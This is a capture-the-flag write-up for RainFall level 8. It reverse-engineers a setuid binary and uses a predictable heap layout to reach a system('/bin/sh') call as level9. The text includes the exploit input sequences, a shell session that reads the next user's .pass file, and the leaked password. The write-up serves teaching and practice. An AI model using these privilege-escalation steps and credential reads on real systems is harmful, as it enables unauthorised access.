# Level 8
## Initial Analysis
### 1. Examine the Binary
```bash
level8@RainFall:~$ ls -la
total 8
dr-xr-x---+ 1 level8 level8   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level8 level8  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level8 level8 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
-rw-r--r--+ 1 level8 level8   65 Sep 23  2015 .pass
-rw-r--r--  1 level8 level8  675 Apr  3  2012 .profile
```
**Key observations:**

- setuid and setgid binary (s flags in permissions)

- Owned by level9 user

- When executed, runs with level9 privileges

### 2. Test Basic Execution
```bash
level8@RainFall:~$ ./level8
(nil), (nil)
test
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
login
(nil), (nil)
^C
```
### Initial Observations:

- Program displays two pointers: (auth), (service)

- Initially both are NULL (nil)

- Responds to specific commands: auth, service, login, reset

- After auth command, first pointer gets a value

- After service command, second pointer gets a value

- login command doesn't give shell (yet)

## Reverse Engineering
### 3. Function Analysis
```bash
level8@RainFall:~$ gdb level8
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x080483c4  _init
0x08048410  printf@plt
0x08048420  free@plt
0x08048430  strdup@plt
0x08048440  fgets@plt
0x08048450  fwrite@plt
0x08048460  strcpy@plt
0x08048470  malloc@plt
0x08048480  system@plt      ← Target!
0x08048564  main
```
## Critical Discovery:

- system@plt available at 0x8048480

- No separate functions - everything is in main()

- Program is a command interpreter

### 4. Disassembling Main - Understanding the Commands

```bash
(gdb) disas main
The assembly reveals the program compares user input against several strings:

Address	String	Length	Command
0x8048819	"auth "	5	Authentication command
0x804881f	"reset"	5	Reset/free command
0x8048825	"service"	6	Service allocation
0x804882d	"login"	5	Login attempt
```
## 5. Global Variables
- Two important global pointers are used:

- 0x8049aac: Stores auth structure pointer

- 0x8049ab0: Stores service string pointer

## 6. Understanding Each Command
```
Auth Command
assembly
0x080485e4: call malloc(4)           # Allocates 4 bytes
0x0804863d: call strcpy(auth_ptr, input+5)  # Copies user data after "auth "
Vulnerability: strcpy() copies arbitrary length data into a 4-byte buffer!

Reset Command
assembly
0x08048673: call free(auth_ptr)       # Frees the auth structure

Service Command
assembly
0x080486ab: call strdup(input+7)      # Duplicates string after "service"
0x080486b0: mov %eax, 0x8049ab0       # Stores pointer in service global

Login Command - The Prize
assembly
0x080486e2: mov 0x8049aac, %eax       # Load auth pointer
0x080486e7: mov 0x20(%eax), %eax      # Check auth[32] (32 bytes offset!)
0x080486ea: test %eax, %eax            # Is it non-zero?
0x080486ec: je 0x80486ff               # If zero, print "Password:"
0x080486ee: movl $0x8048833, (%esp)    # "/bin/sh" string
0x080486f5: call 0x8048480 <system@plt> # SPAWN SHELL! 🎯
Critical Condition: system("/bin/sh") is called ONLY if the byte at auth_ptr + 32 is non-zero!
```

## Understanding the Heap Layout
### 7. Heap Allocation Pattern
- When we issue commands, the heap layout looks like this:

- After auth command:

```text
auth_ptr = 0x804a008
┌─────────────────┐
│  4-byte buffer  │ ← auth (mallocs are 4 bytes aligned)
│  for auth data  │
└─────────────────┘
[heap metadata] (8-12 bytes depending on implementation)
After first service command:
```

```text
auth_ptr = 0x804a008
service_ptr = 0x804a018 (16 bytes later!)
┌─────────────────┐
│  4-byte buffer  │ ← auth
├─────────────────┤
│  heap metadata  │ (typically 8 bytes)
├─────────────────┤
│   12 bytes      │ ← padding/alignment
│   (unused)      │
├─────────────────┤
│ service buffer  │ ← strdup allocates here
│ (variable size) │
└─────────────────┘
```
## The Critical Distance:

- auth_ptr = 0x804a008

- auth_ptr + 32 = 0x804a028

- After one service: service_ptr = 0x804a018 (16 bytes offset)

- After two services: second service_ptr = 0x804a028 (32 bytes offset) ⭐

### 8. The Exploit Strategy

- We need to make the byte at auth_ptr + 32 non-zero. This can be achieved by:

**Option A: Two service allocations**

- First service allocates at offset +16

- Second service allocates at offset +32

- Second service buffer contains our data → non-zero at auth_ptr+32

- Option B: Long service string

- Make service string 16 bytes long

- Service buffer spans from +16 to +32

- auth_ptr+32 falls within service buffer → contains our data

## Exploitation
### 9. Testing Heap Layout
```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth 
0x804a008, (nil)        # After auth: first pointer gets value
service
0x804a008, 0x804a018    # After service: second pointer at +16
```

### 10. Solution 1: Two Service Allocations
```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth 
0x804a008, (nil)
service
0x804a008, 0x804a018    # First service at +16
service
0x804a008, 0x804a028    # Second service at +32! ⭐
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
**Why it works:**

- First service allocates at offset +16 from auth

- Second service allocates at offset +32 from auth

- Second service buffer contains non-zero data

- auth_ptr + 32 points into second service buffer → non-zero

- Login condition satisfied → shell spawned!

### 11. Solution 2: Long Service String
```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth 
0x804a008, (nil)
service0123456789abcdef    # 16-byte service string
0x804a008, 0x804a018
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
**Why it works:**

- Service string of 16 bytes fills from offset +16 to +32

- auth_ptr + 32 points to the last byte of service buffer

- That byte contains 'f' (non-zero)

- Login condition satisfied → shell spawned!

### 12. Memory State Visualization
**Before exploit:**

```text
Address:   0x804a008      0x804a018      0x804a028
           [auth(4B)][metadata][padding][service1][metadata][???]
Content:   [........][........][........][........][........][0x00]
                                          ↑                   ↑
                                      service_ptr        auth_ptr+32 = 0
```
**After solution 1 (two services):**

```text
Address:   0x804a008      0x804a018      0x804a028
           [auth(4B)][metadata][padding][service1][metadata][service2]
Content:   [........][........][........][........][........][data...]
                                          ↑                   ↑
                                      service1_ptr       auth_ptr+32 = 'd'!
```
**After solution 2 (long service):**

```text
Address:   0x804a008      0x804a018      0x804a028
           [auth(4B)][metadata][padding][service1 (16 bytes)...]
Content:   [........][........][........][0123456789abcdef]
                                          ↑                   ↑
                                      service_ptr        auth_ptr+32 = 'f'!
```
## 13. Getting the Flag

```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth 
0x804a008, (nil)
service0123456789abcdef
0x804a008, 0x804a018
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$ exit
14. Switch to level9
bash
level8@RainFall:~$ su level9
Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
level9@RainFall:~$ 
```
**Vulnerability Analysis**

- Root Cause: Predictable heap layout: malloc allocations are placed at predictable offsets

- Insufficient bounds checking: Condition checks memory beyond allocated buffer

- Missing initialization: Heap memory may contain previous data

**Exploitation Technique:**

- Heap layout mapping: Understood allocation pattern (auth at X, service at X+16)

- Offset calculation: Needed non-zero value at auth_ptr + 32

- Memory placement: Used service allocations to place data at that exact offset

- Condition bypass: Satisfied the login check to trigger system("/bin/sh")

**Key Learning Points:**

- Heap allocations follow predictable patterns (especially with simple malloc implementations)

- Off-by-one vulnerabilities can be exploited through careful heap layout manipulation

- Global pointers store references to heap-allocated memory

- Condition checks on heap memory can be bypassed by controlling allocation patterns

- No overflow needed - just understanding memory layout can lead to exploitation

**Heap Layout Summary:**

- Allocation	Typical Offset from auth
- auth	0 bytes
- heap metadata	+4 to +12
- first service	+16 bytes
- second service	+32 bytes ⭐
- Final Commands
**Solution 1 (Two services):**
```bash
./level8
auth 
service
service
login
```
**Solution 2 (Long service):**
```bash
./level8
auth 
service0123456789abcdef
login
Password for level9: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
- This level demonstrates that exploitation doesn't always require buffer overflows or format strings - sometimes simply understanding how the heap allocator works and the predictable patterns it follows can lead to bypassing security checks and gaining elevated privileges.